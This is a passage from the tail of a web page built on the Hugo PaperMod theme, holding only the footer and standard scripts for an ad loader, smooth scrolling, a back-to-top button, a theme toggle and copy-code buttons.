        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2303473689051162" crossorigin=anonymous></script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>